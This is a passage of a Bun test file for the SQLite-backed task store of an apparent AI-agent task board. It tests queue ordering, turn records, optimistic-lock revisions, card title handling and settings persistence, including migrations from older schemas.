import { Database } from "bun:sqlite";
import { afterAll, describe, expect, test } from "bun:test";
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	rmSync,
	symlinkSync,
	watch,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { StoreLockedError } from "./dblock.ts";
import {
	ARCH_REVIEW_MARKER,
	RETRO_MARKER,
	RULES_INTERVIEW_MARKER,
} from "./prompts.ts";
import {
	adoptSharedProjectData,
	DEFAULT_SETTINGS,
	discoverProjects,
	ProjectStore,
	shortTitle,
	tasksDirFor,
} from "./store.ts";
import { prConflictReason } from "./supervisor.ts";
import { answeredCard, type RecordedFinding, type Task } from "./types.ts";

const root = mkdtempSync(join(tmpdir(), "store-model-"));
const opened: ProjectStore[] = [];
/** Track every store so teardown closes them: an open SQLite file makes rmSync EBUSY on Windows. */
const open = async (dbPath: string) => {
	const store = await ProjectStore.open(dbPath);
	opened.push(store);
	return store;
};
afterAll(async () => {
	for (const store of opened) await store.close(); // double close is a no-op
	rmSync(root, { recursive: true, force: true, maxRetries: 5 });
});

describe("reorderQueue", () => {
	test("exact permutation moves a task to the front as queueIds reports", async () => {
		const store = await open(join(root, "reorder"));
		const a = await store.createTask("a");
		const b = await store.createTask("b");
		const c = await store.createTask("c");
		// Distinct queuedAt so the initial order cannot depend on same-millisecond ties.
		await store.updateTask(a.id, { queuedAt: 1 });
		await store.updateTask(b.id, { queuedAt: 2 });
		await store.updateTask(c.id, { queuedAt: 3 });
		expect(await store.queueIds()).toEqual([a.id, b.id, c.id]);
		expect(await store.reorderQueue([c.id, a.id, b.id])).toBe(true);
		expect(await store.queueIds()).toEqual([c.id, a.id, b.id]);
		await store.close();
	});

	test("wrong length, duplicate id, and unknown id each return false without writing", async () => {
		const store = await open(join(root, "reorder-bad"));
		const a = await store.createTask("a");
		const b = await store.createTask("b");
		await store.updateTask(a.id, { queuedAt: 1 });
		await store.updateTask(b.id, { queuedAt: 2 });
		const before = await store.queueIds();
		expect(await store.reorderQueue([a.id])).toBe(false);
		expect(await store.reorderQueue([a.id, a.id])).toBe(false);
		expect(await store.reorderQueue([a.id, "nope"])).toBe(false);
		expect(await store.queueIds()).toEqual(before);
		expect(await store.reorderQueue([a.id, b.id])).toBe(true);
		await store.close();
	});
});

describe("turn model", () => {
	test("finishTurn stores the model and listTurns returns it", async () => {
		const store = await open(join(root, "fresh"));
		const task = await store.createTask("do things");
		const turn = await store.startTurn(task.id, "work", "do things", null);
		expect(turn.model).toBeNull();
		await store.finishTurn(turn.id, {
			endedAt: Date.now(),
			model: "zai/glm-5.3-flash",
		});
		expect((await store.listTurns(task.id))[0]?.model).toBe(
			"zai/glm-5.3-flash",
		);
		await store.close();
	});

	test("finishTurn stores ranOn and listTurns returns it", async () => {
		const store = await open(join(root, "ran-on"));
		const task = await store.createTask("do things");
		const turn = await store.startTurn(task.id, "work", "do things", null);
		expect(turn.ranOn).toBeNull();
		await store.finishTurn(turn.id, {
			endedAt: Date.now(),
			ranOn: "worker-a (abc)",
		});
		expect((await store.listTurns(task.id))[0]?.ranOn).toBe("worker-a (abc)");
		await store.close();
	});

	test("openOrRecentTurns keeps open turns and turns that ended after the cutoff", async () => {
		// OTTR-763: the checkout guard's attribution candidates. A turn whose window
		// [startedAt, endedAt or open] cannot overlap the cutoff and later times is out.
		const store = await open(join(root, "open-or-recent"));
		const task = await store.createTask("do things");
		const cutoff = Date.now();
		const ended = await store.startTurn(task.id, "work", "ended after", null);
		await store.finishTurn(ended.id, { endedAt: cutoff + 1000 });
		const openTurn = await store.startTurn(task.id, "work", "still open", null);
		const old = await store.startTurn(task.id, "work", "ended earlier", null);
		await store.finishTurn(old.id, { endedAt: cutoff - 60_000 });

		const ids = (await store.openOrRecentTurns(cutoff)).map((t) => t.id);
		expect(ids).toContain(ended.id);
		expect(ids).toContain(openTurn.id);
		expect(ids).not.toContain(old.id);
		await store.close();
	});

	test("lastTurnModel returns the newest turn that recorded a model", async () => {
		const store = await open(join(root, "last-model"));
		const task = await store.createTask("snapshot");
		expect(await store.lastTurnModel(task.id)).toBeNull(); // nothing ran
		const first = await store.startTurn(task.id, "work", "p", null);
		await store.finishTurn(first.id, { endedAt: Date.now(), model: "a/one" });
		// A running turn records its dispatch model at start, so the chip states it while it runs.
		const second = await store.startTurn(
			task.id,
			"work",
			"p",
			null,
			null,
			"a/two",
		);
		expect(await store.lastTurnModel(task.id)).toBe("a/two");
		await store.finishTurn(second.id, { endedAt: Date.now(), model: "a/two" });
		expect(await store.lastTurnModel(task.id)).toBe("a/two");
		// A running turn without a model leaves the last recorded one standing.
		await store.startTurn(task.id, "work", "p", null);
		expect(await store.lastTurnModel(task.id)).toBe("a/two");
		await store.close();
	});

	test("open backfills turns.model on a pre-existing database", async () => {
		const dir = join(root, "legacy");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
		// Schema as it was before the model column existed.
		db.exec(
			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT)",
		);
		db.close();
		const store = await open(dir);
		const task = await store.createTask("legacy");
		const turn = await store.startTurn(task.id, "work", "legacy", null);
		await store.finishTurn(turn.id, { model: "openai/gpt-5" });
		expect((await store.listTurns(task.id))[0]?.model).toBe("openai/gpt-5");
		await store.close();
	});
});

describe("boardCardFacts", () => {
	// The batched read must return the same facts the per-task calls report, for every
	// card shape the board shows (OTTR-721).
	test("batched facts match the per-task reads", async () => {
		const store = await open(join(root, "board-facts"));
		// Running: a work turn is still open and carries its dispatch model.
		const running = await store.createTask("running card");
		await store.startTurn(
			running.id,
			"work",
			"running card",
			null,
			null,
			"a/live",
		);
		// Done and answered: the newest work turn reported "answered".
		const answered = await store.createTask("answered card");
		const a1 = await store.startTurn(
			answered.id,
			"work",
			"answered card",
			null,
		);
		await store.finishTurn(a1.id, {
			endedAt: Date.now(),
			outcome: "ready",
			model: "a/one",
		});
		const a2 = await store.startTurn(
			answered.id,
			"work",
			"answered card",
			null,
		);
		await store.finishTurn(a2.id, {
			endedAt: Date.now(),
			outcome: "answered",
			model: "a/two",
		});
		await store.updateTask(answered.id, { stage: "done" });
		// Done but not answered: a later work turn replaces the answered one.
		const notAnswered = await store.createTask("not answered card");
		const n1 = await store.startTurn(
			notAnswered.id,
			"work",
			"not answered",
			null,
		);
		await store.finishTurn(n1.id, { endedAt: Date.now(), outcome: "answered" });
		const n2 = await store.startTurn(
			notAnswered.id,
			"work",
			"not answered",
			null,
		);
		await store.finishTurn(n2.id, {
			endedAt: Date.now(),
			outcome: "ready",
			model: "a/three",
		});
		await store.updateTask(notAnswered.id, { stage: "done" });
		// No turns at all.
		const silent = await store.createTask("never ran");

		const facts = await store.boardCardFacts();
		for (const t of await store.listTasks()) {
			const tf = facts.turns.get(t.id);
			// The map is total over the task rows: a turn-less task reads as all-null.
			expect(tf).toBeDefined();
			const turns = await store.listTurns(t.id);
			const live = turns.find((x) => x.endedAt === null);
			expect(tf?.openTurn ?? null).toEqual(
				live === undefined
					? null
					: { startedAt: live.startedAt, kind: live.kind, model: live.model },
			);
			expect(tf?.lastModel ?? null).toBe(await store.lastTurnModel(t.id));
			expect(tf?.lastWorkOutcome === "answered").toBe(answeredCard(turns));
			// The batched card title equals frozenTitle for every title source.
			expect(
				await store.frozenTitleFrom(t, facts.titles.get(t.id) ?? null),
			).toBe(await store.frozenTitle(t));
		}
		// Targeted reads for the four shapes the board shows.
		expect(facts.turns.get(running.id)!.openTurn).toEqual({
			startedAt: expect.any(Number),
			kind: "work",
			model: "a/live",
		});
		expect(facts.turns.get(running.id)!.lastWorkOutcome).toBeNull();
		const answeredFacts = facts.turns.get(answered.id)!;
		expect(answeredFacts.openTurn).toBeNull();
		expect(answeredFacts.lastModel).toBe("a/two");
		expect(answeredFacts.lastWorkOutcome).toBe("answered");
		const notAnsweredFacts = facts.turns.get(notAnswered.id)!;
		expect(notAnsweredFacts.lastModel).toBe("a/three");
		expect(notAnsweredFacts.lastWorkOutcome).toBe("ready");
		expect(facts.turns.get(silent.id)).toEqual({
			openTurn: null,
			lastModel: null,
			lastWorkOutcome: null,
		});
		// Titles ship raw; the stored value arrives for the named task only.
		await store.nameTask(silent.id, "**Named by the tracker**");
		expect((await store.boardCardFacts()).titles.get(silent.id)).toBe(
			"**Named by the tracker**",
		);
		await store.close();
	});

	test("a title found in the transcript persists once through frozenTitleFrom", async () => {
		const store = await open(join(root, "board-facts-persist"));
		const task = await store.createTask("unnamed card");
		const facts = await store.boardCardFacts();
		// No stored title anywhere: the fallback is the short prompt cut, never persisted.
		expect(facts.titles.get(task.id) ?? null).toBeNull();
		expect(
			await store.frozenTitleFrom(task, facts.titles.get(task.id) ?? null),
		).toBe(shortTitle("unnamed card"));
		await store.nameTask(task.id, "**Named once**");
		// The batched read now carries the raw stored title; cleaning stays on read.
		expect((await store.boardCardFacts()).titles.get(task.id)).toBe(
			"**Named once**",
		);
		expect(
			await store.frozenTitleFrom(
				(await store.getTask(task.id))!,
				(await store.boardCardFacts()).titles.get(task.id) ?? null,
			),
		).toBe("Named once");
		await store.close();
	});
});

describe("editTask", () => {
	test("replaces the prompt and re-derives the title from the new first line", async () => {
		const store = await open(join(root, "editable"));
		const task = await store.createTask("first line\nsecond line");
		expect(task.title).toBe("first line");
		const edited = await store.editTask(task.id, "renamed lead\nnew body");
		expect(edited.ok).toBe(true);
		expect(edited.task.prompt).toBe("renamed lead\nnew body");
		expect(edited.task.title).toBe("renamed lead");
		expect(edited.task.stage).toBe("todo");
		await store.close();
	});
});

describe("revision (optimistic locking)", () => {
	test("a write with the current revision passes and moves the revision", async () => {
		const store = await open(join(root, "revision-current"));
		const task = await store.createTask("original prompt");
		expect(task.revision).toBe(1);
		const result = await store.updateTaskIfCurrent(
			task.id,
			{ prompt: "edit one" },
			1,
		);
		expect(result.ok).toBe(true);
		expect(result.task.revision).toBe(2);
		expect(result.task.prompt).toBe("edit one");
		await store.close();
	});

	test("the prompt-edit hold claim is guarded and contentless", async () => {
		const store = await open(join(root, "hold-claim-current"));
		const task = await store.createTask("original prompt");
		const rev = (await store.getTask(task.id))!.revision;
		const result = await store.claimPromptHold(task.id, 12345, rev);
		expect(result.ok).toBe(true);
		expect(result.task.holdUntil).toBe(12345);
		// The hold is bookkeeping, not content: the revision the editor armed its
		// save from stays current, so the save never 409s against its own claim.
		expect(result.task.revision).toBe(rev);
		expect((await store.getTask(task.id))!.revision).toBe(rev);
		await store.close();
	});

	test("a stale prompt-edit hold claim conflicts without writing", async () => {
		const store = await open(join(root, "hold-claim-stale"));
		const task = await store.createTask("original prompt");
		// Another tab's content edit lands between this editor's load and its claim.
		await store.updateTask(task.id, { prompt: "first edit" });
		const result = await store.claimPromptHold(task.id, 12345, 1);
		expect(result.ok).toBe(false);
		expect(result.task.prompt).toBe("first edit");
		// The stale draft must not arm, and the hold must not land.
		expect(result.task.holdUntil).toBeNull();
		expect((await store.getTask(task.id))!.holdUntil).toBeNull();
		await store.close();
	});

	test("releasing the prompt-edit hold is contentless too", async () => {
		const store = await open(join(root, "hold-release"));
		const task = await store.createTask("original prompt");
		const rev = (await store.getTask(task.id))!.revision;
		await store.claimPromptHold(task.id, 12345, rev);
		await store.releasePromptHold(task.id);
		const after = (await store.getTask(task.id)) as Task;
		expect(after.holdUntil).toBeNull();
		expect(after.holdProvider).toBeNull();
		expect(after.holdWindow).toBeNull();
		expect(after.revision).toBe(rev);
		await store.close();
	});

	test("a write with a stale revision changes nothing and reports the conflict with the current row", async () => {
		const store = await open(join(root, "revision-stale"));
		const task = await store.createTask("original prompt");
		// First writer wins: bumps the row to revision 2 with its own prompt and updated_at.
		const first = await store.updateTaskIfCurrent(
			task.id,
			{ prompt: "first edit" },
			1,
		);
		expect(first.ok).toBe(true);
		const winner = (await store.getTask(task.id)) as Task;
		// Second tab still holds revision 1: the write must not land.
		const second = await store.updateTaskIfCurrent(
			task.id,
			{ prompt: "second edit" },
			1,
		);
		expect(second.ok).toBe(false);
		expect(second.task).toEqual(winner);
		// The first writer's values survive untouched.
		const row = (await store.getTask(task.id)) as Task;
		expect(row.prompt).toBe("first edit");
		expect(row.updatedAt).toBe(winner.updatedAt);
		expect(row.revision).toBe(2);
		await store.close();
	});

	test("an internal updateTask always passes and bumps the revision", async () => {
		const store = await open(join(root, "revision-internal"));
		const task = await store.createTask("internal");
		await store.updateTask(task.id, { summary: "one" });
		expect((await store.getTask(task.id))?.revision).toBe(2);
		await store.updateTask(task.id, { summary: "two" });
		expect((await store.getTask(task.id))?.revision).toBe(3);
		await store.close();
	});

	test("editTask passes with the current revision and conflicts with a stale one", async () => {
		const store = await open(join(root, "revision-edit"));
		const task = await store.createTask("first line\nsecond line");
		const current = await store.editTask(task.id, "renamed lead\nnew body", 1);
		expect(current.ok).toBe(true);
		expect(current.task.title).toBe("renamed lead");
		expect(current.task.revision).toBe(2);
		// The stale editor's revision 1 no longer matches.
		const stale = await store.editTask(task.id, "lost edit", 1);
		expect(stale.ok).toBe(false);
		expect(stale.task.prompt).toBe("renamed lead\nnew body");
		expect(((await store.getTask(task.id)) as Task).revision).toBe(2);
		await store.close();
	});

	test("an unknown id still throws before any write", async () => {
		const store = await open(join(root, "revision-unknown"));
		await expect(
			store.updateTaskIfCurrent("nope", { prompt: "x" }, 1),
		).rejects.toThrow("unknown task: nope");
		await store.close();
	});

	test("an old-schema database without the column converges on open and starts writing revisions", async () => {
		const dir = join(root, "revision-migration");
		mkdirSync(join(dir, ".tasks"), { recursive: true });
		const db = new Database(join(dir, ".tasks", "tasks.db"));
		// Shape of a database created before revision existed: full post-backfill column
		// set minus the new column.
		db.exec(`CREATE TABLE tasks (
			id TEXT PRIMARY KEY,
			title TEXT,
			prompt TEXT,
			stage TEXT NOT NULL CHECK (stage IN ('todo','in_progress','merging','done','backlog','parked')),
			state TEXT NOT NULL CHECK (state IN ('queued','running','needs_you','idle')),
			needs_reason TEXT,
			pending_prompt TEXT,
			branch TEXT,
			base TEXT,
			worktree TEXT,
			session_id TEXT,
			summary TEXT,
			details TEXT,
			created_at INTEGER NOT NULL,
			updated_at INTEGER NOT NULL,
			queued_at INTEGER,
			cancelled_at INTEGER,
			images TEXT NOT NULL DEFAULT '[]',
			pending_images TEXT NOT NULL DEFAULT '[]',
			release_version TEXT,
			release_notes TEXT,
			session_title TEXT,
			asked TEXT,
			model TEXT,
			kept_files TEXT NOT NULL DEFAULT '[]',
			follow_up_of TEXT,
			push_sha TEXT,
			update_ids TEXT NOT NULL DEFAULT '[]',
			update_merge_approved INTEGER NOT NULL DEFAULT 0
		)`);
		db.exec(
			"INSERT INTO tasks (id, title, stage, state, created_at, updated_at) VALUES ('seed1', 'seeded', 'in_progress', 'running', 1, 1)",
		);
		db.close();

		const store = await open(dir);
		// The seeded row survives and reads the default revision.
		const seeded = (await store.getTask("seed1")) as Task;
		expect(seeded.title).toBe("seeded");
		expect(seeded.revision).toBe(1);
		// The first write moves the revision.
		const result = await store.updateTaskIfCurrent(
			"seed1",
			{ prompt: "edited" },
			1,
		);
		expect(result.ok).toBe(true);
		expect(result.task.revision).toBe(2);
		// No duplicate column on the next open: convergence is done.
		await store.close();
		const reopened = await open(dir);
		expect(((await reopened.getTask("seed1")) as Task).revision).toBe(2);
		await reopened.close();
	});
});

describe("deriveTitle", () => {
	test("skips section labels and strips heading marks", async () => {
		const store = await open(join(root, "derive-title"));
		const cases: Array<[string, string]> = [
			["# Goal\n\nFix the login redirect\nmore", "Fix the login redirect"],
			["# Set up agent rules for demo\nbody", "Set up agent rules for demo"],
			["first line\nsecond line", "first line"],
			["# Goal", "Goal"],
			// Overlong first line cuts at a word boundary, never mid-word.
			[
				"Rebase and retry when the server push after a merge fails because origin/main moved",
				"Rebase and retry when the server push after a merge fails because origin/main…",
			],
		];
		for (const [prompt, title] of cases)
			expect((await store.createTask(prompt)).title).toBe(title);
		await store.close();
	});

	test("edited cards re-derive with section labels skipped", async () => {
		const store = await open(join(root, "derive-title-edit"));
		const task = await store.createTask("# Goal\nfirst title");
		expect(task.title).toBe("first title");
		const edited = await store.editTask(task.id, "# Goal\nsecond title");
		expect(edited.task.title).toBe("second title");
		await store.close();
	});
});

describe("asked", () => {
	const ask = [
		{
			question: "Which way?",
			options: [{ label: "A", description: "faster" }, { label: "B" }],
			multi: false,
			recommended: 1,
		},
	];

	test("updateTask stores the ask and getTask parses it back", async () => {
		const store = await open(join(root, "asked"));
		const task = await store.createTask("do things");
		expect((await store.getTask(task.id))?.asked).toBeNull();
		await store.updateTask(task.id, { asked: ask });
		expect((await store.getTask(task.id))?.asked).toEqual(ask);
		await store.close();
	});

	test("null clears and corrupt JSON parses back as null instead of throwing", async () => {
		const store = await open(join(root, "asked-bad"));
		const task = await store.createTask("do things");
		await store.updateTask(task.id, {
			asked: "{not json" as unknown as typeof ask,
		});
		expect((await store.getTask(task.id))?.asked).toBeNull();
		await store.updateTask(task.id, { asked: null });
		expect((await store.getTask(task.id))?.asked).toBeNull();
		await store.close();
	});
});

describe("frozenTitle", () => {
	test("persists the session's first title once; a later rewrite cannot rename the card", async () => {
		const store = await open(join(root, "frozen-title"));
		const sid = "bbbb0000-0000-0000-0000-000000000101";
		const task = await store.updateTask(
			(await store.createTask("still untitled")).id,
			{
				sessionId: sid,
			},
		);
		expect(await store.frozenTitle(task)).toBe(shortTitle("still untitled")); // no session file yet: prompt-line fallback
		mkdirSync(store.sessionsDir, { recursive: true });
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
			'{"type":"title","v":1,"title":"Persisted"}\n{"type":"session"}\n{"type":"title_change","title":"Persisted"}\n',
		);
		expect(await store.frozenTitle(task)).toBe("Persisted");
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
			'{"type":"title","v":1,"title":"Renamed"}\n{"type":"session"}\n{"type":"title_change","title":"Renamed"}\n',
		);
		expect(await store.frozenTitle(task)).toBe("Persisted"); // the first write stays authoritative
		await store.close();
	});

	test("a Markdown-wrapped title displays and persists clean, from transcript and stored row", async () => {
		const store = await open(join(root, "frozen-title-markdown"));
		const sid = "bbbb0000-0000-0000-0000-000000000201";
		const task = await store.updateTask(
			(await store.createTask("still untitled")).id,
			{
				sessionId: sid,
			},
		);
		mkdirSync(store.sessionsDir, { recursive: true });
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
			'{"type":"title","v":1,"title":"**Task Name: OTTR-292**"}\n{"type":"session"}\n{"type":"title_change","title":"**Task Name: OTTR-292**"}\n',
		);
		expect(await store.frozenTitle(task)).toBe("Task Name: OTTR-292");

		// A row written dirty before the cleaning reads clean too — no migration needed.
		const legacy = await store.createTask("legacy dirty row");
		await store.nameTask(legacy.id, "**Task Name: OTTR-292**");
		expect(await store.sessionTitle((await store.getTask(legacy.id))!)).toBe(
			"Task Name: OTTR-292",
		);
		await store.close();
	});

	test("a pending title retry holds the transcript title back; the prefix never displays", async () => {
		const store = await open(join(root, "frozen-title-hold"));
		const sid = "bbbb0000-0000-0000-0000-000000000301";
		const task = await store.updateTask(
			(await store.createTask("still untitled")).id,
			{
				sessionId: sid,
			},
		);
		mkdirSync(store.sessionsDir, { recursive: true });
		writeFileSync(
			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sid}.jsonl`),
			'{"type":"title","v":1,"title":"🩻 SKELE: Prefixed name"}\n{"type":"session"}\n{"type":"title_change","title":"🩻 SKELE: Prefixed name"}\n',
		);
		await store.holdTitle(task.id, () => {});
		// While the generation retry is pending, the transcript title stays unused.
		expect(await store.sessionTitle(task)).toBeNull();
		expect(await store.frozenTitle(task)).toBe(shortTitle("still untitled"));
		// The retry settled: the hold ends and the transcript title names the card, clean.
		expect(await store.releaseTitleHold(task.id)).toBe(true);
		expect(await store.frozenTitle(task)).toBe("Prefixed name");
		expect(await store.releaseTitleHold(task.id)).toBe(false); // already released
		await store.close();
	});

	test("title cleanup and path helpers remain async after database close", async () => {
		const store = await open(join(root, "title-cleanup-after-close"));
		const task = await store.createTask("title retry");
		const cancelled: string[] = [];
		const initialHold = store.holdTitle(task.id, () => {
			cancelled.push("initial");
		});
		expect(initialHold).toBeInstanceOf(Promise);
		await initialHold;
		expect(await store.titleHold(task.id)).toBe(true);
		await store.close();
		expect(cancelled).toEqual([]);

		const initialRelease = store.releaseTitleHold(task.id);
		expect(initialRelease).toBeInstanceOf(Promise);
		expect(await initialRelease).toBe(true);
		expect(cancelled).toEqual(["initial"]);
		expect(await store.releaseTitleHold(task.id)).toBe(false);
		expect(await store.titleHold(task.id)).toBe(false);
		expect(cancelled).toEqual(["initial"]);

		const replacementHold = store.holdTitle(task.id, () => {
			cancelled.push("replaced");
		});
		expect(replacementHold).toBeInstanceOf(Promise);
		await replacementHold;
		await store.holdTitle(task.id, () => {
			cancelled.push("replacement");
		});
		expect(cancelled).toEqual(["initial", "replaced"]);
		const held = store.titleHold(task.id);
		expect(held).toBeInstanceOf(Promise);
		expect(await held).toBe(true);
		expect(await store.releaseTitleHold(task.id)).toBe(true);
		expect(await store.releaseTitleHold(task.id)).toBe(false);
		expect(await store.titleHold(task.id)).toBe(false);
		expect(cancelled).toEqual(["initial", "replaced", "replacement"]);

		const logPath = store.logPath(task.id);
		const imagesDir = store.imagesDir(task.id);
		expect(logPath).toBeInstanceOf(Promise);
		expect(imagesDir).toBeInstanceOf(Promise);
		expect(await logPath).toBe(join(store.tasksDir, "logs", `${task.id}.log`));
		expect(await imagesDir).toBe(join(store.tasksDir, "images", task.id));
		await expect(store.getTask(task.id)).rejects.toThrow("Store is closed");
	});
});

describe("shortTitle", () => {
	test("short lines pass through, long lines cut at a word boundary", async () => {
		expect(shortTitle("Fix the login bug")).toBe("Fix the login bug");
		const long =
			"Fix the login bug when the session cookie expires mid request";
		const named = shortTitle(long);
		expect(named.endsWith("…")).toBe(true);
		expect(named.length).toBeLessThanOrEqual(49);
		expect(named).toBe("Fix the login bug when the session cookie…");
		expect(shortTitle("a".repeat(80))).toBe(`${"a".repeat(48)}…`); // no space: hard cut
	});
});

describe("settings", () => {
	test("displayName and releaseCommand survive a reopen, reset to null, and leave the other settings alone", async () => {
		const dir = join(root, "settings-name");
		let store = await open(dir);
		expect((await store.getSettings()).displayName).toBeNull();
		expect((await store.getSettings()).releaseCommand).toBeNull();
		await store.setSettings({ maxParallel: 3 });
		await store.setSettings({ displayName: "Ottr" });
		await store.setSettings({
			releaseCommand: "node scripts/release.mjs --ottr",
		});
		await store.setSettings({
			archReviewCap: 80,
			maxImages: 4,
		});
		await store.close();
		store = await open(dir);
		expect(await store.getSettings()).toEqual({
			maxParallel: 3,
			copyExtra: [],
			displayName: "Ottr",
			iconText: null,
			releaseCommand: "node scripts/release.mjs --ottr",
			archReviewCap: 80,
			maxImages: 4,
			keptWorktreeDays: 7,
			autoTend: false,
			autoTendLimit: 12,
			tendChurnGlobs: [],
			holdUpdateMerges: false,
			forkMergeHold: true,
			retroSince: null,
			retroFilter: true,
			forkResearch: false,
			prReviews: false,
			prReviewNotify: true,
			prReviewApprove: false,
			prMode: false,
			microVm: false,
			trendingScout: false,
			issueWatch: false,
			issueWatchSince: null,
			jiraConnection: null,
			jiraLastJql: null,
			ompWatch: false,
			setupChecklist: false,
			targetBranch: null,
			originUrl: null,
			pushSyncCommits: false,
			taskIdPrefix: null,
		});
		await store.setSettings({ displayName: null, releaseCommand: null });
		expect(await store.getSettings()).toEqual({
			maxParallel: 3,
			copyExtra: [],
			displayName: null,
			iconText: null,
			releaseCommand: null,
			archReviewCap: 80,
			maxImages: 4,
			keptWorktreeDays: 7,
			autoTend: false,
			autoTendLimit: 12,
			tendChurnGlobs: [],
			holdUpdateMerges: false,
			forkMergeHold: true,
			retroSince: null,
			retroFilter: true,
			forkResearch: false,
			prReviews: false,
			prReviewNotify: true,
			prReviewApprove: false,
			prMode: false,
			microVm: false,
			trendingScout: false,
			issueWatch: false,
			issueWatchSince: null,
			jiraConnection: null,
			jiraLastJql: null,
			ompWatch: false,
			setupChecklist: false,
			targetBranch: null,
			originUrl: null,
			pushSyncCommits: false,
			taskIdPrefix: null,
		});
		await store.close();
	});

	test("a settings blob from before forkMergeHold reads the default on", async () => {
		const dir = join(root, "settings-pre-fork-merge-hold");
		let store = await open(dir);
		// A project last written before the switch existed holds only the older keys:
		// one row per key, none named forkMergeHold.
		await store.setSettings({ holdUpdateMerges: false });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).holdUpdateMerges).toBe(false);
		expect((await store.getSettings()).forkMergeHold).toBe(true);
		await store.close();
	});

	test("iconText persists across a reopen and resets to null", async () => {
		const dir = join(root, "settings-icon-text");
		let store = await open(dir);
		expect((await store.getSettings()).iconText).toBeNull();
		await store.setSettings({ iconText: "OT" });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).iconText).toBe("OT");
		await store.setSettings({ iconText: null });
		expect((await store.getSettings()).iconText).toBeNull();
		await store.close();
	});

	test("numeric knobs keep the defaults when unset and persist overrides", async () => {
		const dir = join(root, "settings-numbers");
		const probe = await open(dir);
		expect(await probe.getSettings()).toMatchObject({
			archReviewCap: 150,
			maxImages: 8,
			keptWorktreeDays: 7,
		});
		await probe.close();
		const store = await open(dir);
		await store.setSettings({ archReviewCap: 300 });
		expect((await store.getSettings()).archReviewCap).toBe(300);
		expect((await store.getSettings()).maxImages).toBe(8);
		await store.close();
	});

	test("originUrl persists across a reopen, resets to null, and a corrupt row keeps the default", async () => {
		const dir = join(root, "settings-origin-url");
		let store = await open(dir);
		expect((await store.getSettings()).originUrl).toBeNull();
		await store.setSettings({ originUrl: "/srv/git/proj.git" });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).originUrl).toBe("/srv/git/proj.git");
		await store.close();
		// A wrong-shape row (a worker, an old bug) must not surface as a pin: parseSetting
		// keeps the null default, which fails closed at the next push (OTTR-348).
		const db = new Database(join(tasksDirFor(dir), "tasks.db"));
		db.run("UPDATE settings SET value = '3' WHERE key = 'originUrl'");
		db.close();
		store = await open(dir);
		expect((await store.getSettings()).originUrl).toBeNull();
		await store.setSettings({ originUrl: null });
		expect((await store.getSettings()).originUrl).toBeNull();
		await store.close();
	});

	test("targetBranch persists across a reopen and resets to null", async () => {
		const dir = join(root, "settings-target-branch");
		let store = await open(dir);
		expect((await store.getSettings()).targetBranch).toBeNull();
		await store.setSettings({ targetBranch: "develop" });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).targetBranch).toBe("develop");
		await store.setSettings({ targetBranch: null });
		expect((await store.getSettings()).targetBranch).toBeNull();
		await store.close();
	});

	test("keptWorktreeDays defaults to 7 and survives setSettings plus a reopen", async () => {
		const dir = join(root, "settings-kept-days");
		let store = await open(dir);
		expect((await store.getSettings()).keptWorktreeDays).toBe(7);
		await store.setSettings({ keptWorktreeDays: 3 });
		await store.close();
		store = await open(dir);
		expect((await store.getSettings()).keptWorktreeDays).toBe(3);
		await store.close();
	});

	test("retro settings default off+filtered, persist across reopen, and reset to null", async () => {
		const dir = join(root, "settings-retro");
		let store = await open(dir);
		expect((await store.getSettings()).retroSince).toBeNull();
		expect((await store.getSettings()).retroFilter).toBe(true);
		const since = 1_700_000_000_000;
		await store.setSettings({ retroSince: since, retroFilter: false });
		await store.close();
		store = await open(dir);
		// retroSince is an epoch number, so the settings key-value read path keeps it
		// exactly; no column or migration involved.
		expect((await store.getSettings()).retroSince).toBe(since);
		expect((await store.getSettings()).retroFilter).toBe(false);
		// Off again: the row resets to null instead of being deleted.
		await store.setSettings({ retroSince: null });
		expect((await store.getSettings()).retroSince).toBeNull();
		await store.close();
	});

	test("runningPids lists only pids of turns that never ended", async () => {
		const store = await open(join(root, "running-pids"));
		const t = await store.createTask("w");
		const live = await store.startTurn(t.id, "work", "p", 4242);
		const ended = await store.startTurn(t.id, "work", "p", 5151);
		const noPid = await store.startTurn(t.id, "work", "p", null);
		await store.finishTurn(ended.id, { endedAt: Date.now(), exitCode: 0 });
		expect(await store.runningPids()).toEqual([4242]);
		await store.finishTurn(live.id, { endedAt: Date.now(), exitCode: 0 });
		expect(await store.runningPids()).toEqual([]);
		await store.finishTurn(noPid.id, { exitCode: 0 });
		await store.close();
	});

	test("auto-tend settings keep the defaults, persist across reopen, and fall back on a corrupt row", async () => {
		const dir = join(root, "settings-auto-tend");
		const probe = await open(dir);
		expect(await probe.getSettings()).toMatchObject({
			autoTend: false,
			autoTendLimit: 12,
			tendChurnGlobs: [],
		});
		await probe.setSettings({
			autoTend: true,
			autoTendLimit: 5,
			tendChurnGlobs: ["**/*.import"],
		});
		await probe.close();
		// Corrupt the tendChurnGlobs row directly: parse failure must keep the default.
		const raw = new Database(join(dir, ".tasks", "tasks.db"));
		raw.run("UPDATE settings SET value = '{oops' WHERE key = 'tendChurnGlobs'");
		raw.close();
		const store = await open(dir);
		expect(await store.getSettings()).toMatchObject({
			autoTend: true,
			autoTendLimit: 5,
			tendChurnGlobs: [],
		});
		await store.close();
	});

	test("settings arrays belong to the caller, never to the shared defaults", async () => {
		const store = await open(join(root, "settings-own-arrays"));
		const first = await store.getSettings();
		first.tendChurnGlobs.push("**/*.import");
		first.copyExtra.push(".env");
		expect(await store.getSettings()).toMatchObject({
			tendChurnGlobs: [],
			copyExtra: [],
		});
		await store.close();
	});
});

describe("release columns", () => {
